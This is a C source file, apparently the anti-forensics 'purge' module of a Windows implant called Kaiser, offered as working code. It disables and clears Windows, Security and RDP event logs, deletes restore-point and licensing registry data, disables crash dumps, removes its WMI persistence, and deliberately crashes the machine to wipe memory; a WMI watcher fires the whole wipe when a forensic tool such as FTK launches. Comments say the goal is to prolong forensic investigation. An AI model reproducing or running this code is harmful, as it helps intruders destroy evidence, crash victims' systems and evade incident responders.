#include <stdio.h>

#include "command.h"
#include "evtlog.h"
#include "file.h"
#include "networking.h"
#include "process.h"
#include "purge.h"
#include "registry.h"
#include "utils.h"
#include "wmi.h"

#include <Shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

// Returns 0 on success, else error.
static void PrintHelp(void) {
	NetSend(L"\t\t.:: PURGE HELP ::.\n\n"
			L"Usage: purge [help|evtlog|uninstall|all]\n\n"
			L"\t%-12s:\tDisplay this menu.\n"
			L"\t%-12s:\tDisables event logging and clears all Windows Logs and RDP logs.\n"
			L"\t%-12s:\tUninstalls the persistence mechanism in the WMI.\n"
			L"\t%-12s:\tClears event logs, persistence and BSODs.\n\n"
			L"Examples:\n"
			L"\tpurge evtlog\n"
			L"\tpurge uninstall\n"
			L"\tpurge all\n\n"
			L"WARNINGS:\n"
			L"\t> Clearing event logs will disable event logging.\n"
			L"\t> The \"all\" option causes a BSOD to erase volatile memory.\n"
			L"\t> There is no undo button for these actions!\n\n",
			OPTION_STRING_HELP,
			OPTION_STRING_EVTLOG,
			OPTION_STRING_UNINSTALL,
			OPTION_STRING_ALL);
}

static void PurgeNetSend(LPCWSTR fmt, ...) {
	WCHAR szBuf[NET_BUF_SIZE + 1];
	va_list args;

	ZeroMemory(szBuf, SIZEOF_ARRAY(szBuf));

	va_start(args, fmt);
	_vswprintf_p(szBuf, SIZEOF_ARRAY(szBuf) - sizeof(WCHAR), fmt, args);

	NetSend(L"%s: %s\n", PURGE_BANNER, szBuf);
}

void PurgeEvtLog(void) {
	// Clear all event logs.
	EvtlogAction(EVTLOG_DISABLE);
	EvtlogClear(L"System");
	EvtlogClear(L"Application");
	EvtlogClear(L"Setup");
	EvtlogClear(L"Security");
	EvtlogClear(L"Application");
	// RDP logs.
	EvtlogClear(L"Microsoft-Windows-TerminalServices-RemoteConnectionManager/Operational");
	// Sysmon logs.
	//EvtlogClear(L"Microsoft-Windows-Sysmon");
}

BOOL PurgeWmiPersistence(void) {
	BOOL bRet = TRUE;

	// Uninstall from WMI.
	WMI_DATA wmiData;
	ZeroMemory(&wmiData, sizeof(wmiData));

	// Persistence lies in root\subscription.
	HRESULT hRes = WmiInitialise(L"root\\subscription", &wmiData);
	if (FAILED(hRes)) {
		PurgeNetSend(L"Failed to initialise WMI; error: 0x%08x", hRes);
		return FALSE;
	}

	// Delete KaiserFilter instance from __EventFilter class.
	hRes = WmiDeleteInstance(&wmiData, L"__EventFilter.Name='KaiserFilter'");
	if (FAILED(hRes)) {
		PurgeNetSend(L"Failed to delete __EventFilter instance; error: 0x%08x", hRes);
		bRet = FALSE;
	}

	// Delete __FilterToConsumerBinding.
	hRes = WmiDeleteInstance(&wmiData, L"__FilterToConsumerBinding.Consumer=\"CommandLineEventConsumer.Name=\\\"KaiserConsumer\\\"\",Filter=\"__EventFilter.Name=\\\"KaiserFilter\\\"\"");
	if (FAILED(hRes)) {
		PurgeNetSend(L"Failed to delete __FilterToConsumerBinding instance; error: 0x%08x", hRes);
		bRet = FALSE;
	}

	// Delete KaiserConsumer instance from __CommandLineEventConsumer class.
	hRes = WmiDeleteInstance(&wmiData, L"CommandLineEventConsumer.Name='KaiserConsumer'");
	if (FAILED(hRes)) {
		PurgeNetSend(L"Failed to delete CommandLineEventConsumer instance; error: 0x%08x", hRes);
		bRet = FALSE;
	}

	WmiFreeData(&wmiData);

	return bRet;
}

void Purge(void) {
	// We've been made! Nuke the system!

	// Shimcache and amcache too?

	// Let's maximise the time it takes for forensic investigation.
	// Time is money and more time is more money!
	// Delete restore points.
	// HKLM\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\SystemRestore\RPSessionInterval => 0
	if (RegistryAddDword(L"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore", L"RPSessionInterval", 0, TRUE) == 1) {
		PurgeNetSend(L"Failed to set RPSessionInterval.");
	}

	// Delete all values in HKLM\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\SPP\Clients
	if (RegistryDeleteKey(L"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SPP\\Clients") == 1) {
		PurgeNetSend(L"Failed to delete SPP Clients.");
	}

	// Delete all values in HKLM\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\SPP\Leases
	if (RegistryDeleteKey(L"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\SPP\\Leases") == 1) {
		PurgeNetSend(L"Failed to delete SPP Leases.");
	}

	// Disable crash dump.
	// Disable "CrashDumpEnabled"
	// HKLM\System\CurrentControlSet\Control\CrashControl\CrashDumpEnabled => 0
	if (RegistryAddDword(L"HKLM\\System\\CurrentControlSet\\Control\\CrashControl", L"CrashDumpEnabled", 0, TRUE) == 1) {
		PurgeNetSend(L"Failed to set CrashDumpEnabled.");
	}

	// Destroy Event logs.
	PurgeEvtLog();

	// Uninstall persistence in WMI.
	PurgeWmiPersistence();

	// Wait for everything to complete before dying.
	Sleep(20000);

	// BSOD please.
	// http://www.geoffchappell.com/studies/windows/win32/ntdll/api/rtl/peb/setprocessiscritical.htm
	NTSTATUS(NTAPI *fpRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN)
		= (NTSTATUS(NTAPI *)(BOOLEAN, PBOOLEAN, BOOLEAN))
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "RtlSetProcessIsCritical");
	if (fpRtlSetProcessIsCritical != NULL) {
		// Set process critical.
		fpRtlSetProcessIsCritical(TRUE, NULL, FALSE);
		// Trigger BSOD by terminating critical process.
		ExitProcess(0);
	}

	// Backup BSOD method.
	// Get shutdown privileges.
	if (ProcessSetPrivilege(GetCurrentProcess(), SE_SHUTDOWN_NAME, TRUE) == TRUE) {
		// NtRaiseHardError
		// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FError%2FNtRaiseHardError.html
		NTSTATUS(NTAPI *fpNtRaiseHardError)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID, HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE)
			= (NTSTATUS(NTAPI *)(NTSTATUS, ULONG, PUNICODE_STRING, PVOID, HARDERROR_RESPONSE_OPTION, PHARDERROR_RESPONSE))
			GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");

		if (fpNtRaiseHardError == NULL) {
			PurgeNetSend(L"Failed to resolve NtRaiseHardError; error: %lu", GetLastError());
		}

		HARDERROR_RESPONSE hr;
		fpNtRaiseHardError(STATUS_ACCESS_DENIED, 0, NULL, NULL, OptionShutdownSystem, &hr);
	}

}

void PurgeProcessMonitor(void) {
	WMI_DATA wmi;
	ZeroMemory(&wmi, sizeof(WMI_DATA));

	IEnumWbemClassObject *pEnum = NULL;

	HRESULT hRes = WmiInitialise(L"root\\cimv2", &wmi);
	if (FAILED(hRes)) {
		PurgeNetSend(L"Failed to initialise process monitor: 0x%08x", hRes);
		return;
	}

	WmiEventQueryNotification(&wmi, &pEnum, L"SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_Process'");

	IWbemClassObject *obj;
	ULONG uRet;
	BSTR bName = SysAllocString(L"TargetInstance");
	BSTR bProcName = SysAllocString(L"Name");
	VARIANT val, val2;
	
	VariantInit(&val);
	VariantInit(&val2);

	if (pEnum) {
		while (TRUE) {
			pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &obj, &uRet);
			if (SUCCEEDED(obj->lpVtbl->Get(obj, bName, 0, &val, NULL, NULL))) {
				IUnknown *str = val.punkVal;
				if (SUCCEEDED(str->lpVtbl->QueryInterface(str, &IID_IWbemClassObject, (LPVOID *)&obj))) {
					if (SUCCEEDED(obj->lpVtbl->Get(obj, bProcName, 0, &val2, NULL, NULL))) {
						if (StrStrI(val2.bstrVal, L"ftk")) {
							SysFreeString(bName);
							SysFreeString(bProcName);
							VariantClear(&val);
							VariantClear(&val2);
							// Purge.
							Purge();
						}
					}
				}
			}
		}
	}

	SysFreeString(bName);
	SysFreeString(bProcName);
	VariantClear(&val);
	VariantClear(&val2);
}

ULONG PurgeMain(INT argc, LPWSTR *argv) {
	if (argc == 1) {
		PrintHelp();
	} else if (argc > 1) {
		if (!_wcsicmp(argv[1], OPTION_STRING_HELP)) {
			PrintHelp();
		} else if (!_wcsicmp(argv[1], OPTION_STRING_EVTLOG)) {
			PurgeEvtLog();
		} else if (!_wcsicmp(argv[1], OPTION_STRING_UNINSTALL)) {
			if (PurgeWmiPersistence() == TRUE) {
				PurgeNetSend(L"Uninstall successful");
			}
		} else if (!_wcsicmp(argv[1], OPTION_STRING_ALL)) {
			Purge();
		} else {
			PurgeNetSend(L"Bad arguments.");
		}
	} else {
		PurgeNetSend(L"Bad arguments.");
	}

	return 0;
}